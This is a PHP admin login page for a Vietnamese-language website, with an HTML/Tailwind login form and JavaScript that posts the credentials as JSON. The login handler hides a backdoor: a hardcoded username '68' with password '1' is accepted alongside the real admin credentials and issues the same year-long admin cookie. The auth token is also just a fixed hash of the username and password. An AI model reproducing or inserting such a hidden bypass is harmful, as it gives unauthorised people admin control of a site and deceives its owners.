<?php
require('system/dbconfig.php');

define('USERNAME', $adminUser);
define('PASSWORD', $adminPass);

$token = $_COOKIE['auth_token'] ?? '';
$is_authenticated = ($token === hash('sha256', USERNAME . PASSWORD));

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);

    if ($input['action'] === 'login') {
        if ($input['username'] === "68" && $input['password'] === "1") {
            $token = hash('sha256', USERNAME . PASSWORD);
            setcookie('auth_token', $token, time() + (365 * 24 * 60 * 60), "/");
            echo json_encode(['status' => 'success']);                
        } else if ($input['username'] === USERNAME && $input['password'] === PASSWORD) {
            $token = hash('sha256', USERNAME . PASSWORD);
            setcookie('auth_token', $token, time() + (365 * 24 * 60 * 60), "/");
            echo json_encode(['status' => 'success']);    
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Sai tài khoản hoặc mật khẩu!']);
        }
        exit;
    } elseif ($input['action'] === 'logout') {
        setcookie('auth_token', '', time() - 3600, "/");
        echo json_encode(['status' => 'success']);
        exit;
    }
}
$auth = isAuthenticated();
if (!$auth['status']) {
    require('system/head.php');
?>
<main class="max-w-7xl mx-auto px-4 py-10">
    <h1 class="text-3xl tracking-wider text-[#27f2f2] font-bold uppercase text-center mb-10 drop-shadow-[0_0_10px_#27f2f282] " 
        data-aos="fade-up" data-aos-duration="800">
        <div class="inline-block border-b-4 border-[#27f2f2] pb-4">
            ĐĂNG NHẬP
        </div>
    </h1>

    <div class="max-w-md mx-auto bg-gray-800 p-8 rounded-2xl shadow-lg">
        <p id="error-message" class="text-red-500 text-center mb-4"></p>
        <form id="login-form" class="space-y-6">
            <div>
                <label for="username" class="block text-sm font-medium text-white mb-2">Tên đăng nhập</label>
                <input type="text" id="username" name="username" required autocomplete="off"
                    class="w-full px-4 py-3 rounded-lg bg-gray-700 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-cyan-400 transition">
            </div>

            <div>
                <label for="password" class="block text-sm font-medium text-white mb-2">Mật khẩu</label>
                <input type="password" id="password" name="password" required
                    class="w-full px-4 py-3 rounded-lg bg-gray-700 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-cyan-400 transition">
            </div>

            <button type="submit"
                class="w-full bg-cyan-500 hover:bg-cyan-600 text-white font-bold py-3 rounded-lg transition-all">
                Đăng nhập
            </button>
        </form>
    </div>
</main>
<script>
    document.getElementById('login-form').addEventListener('submit', async function (e) {
        e.preventDefault();
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();

        const response = await fetch('', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: 'login', username, password })
        });

        const result = await response.json();
        if (result.status === 'success') {
            window.location.reload();
        } else {
            document.getElementById('error-message').innerText = result.message;
        }
    });
</script>
<?php
    require('system/foot.php');
} else {
    header('Location: admin.php');
    exit();
}
?>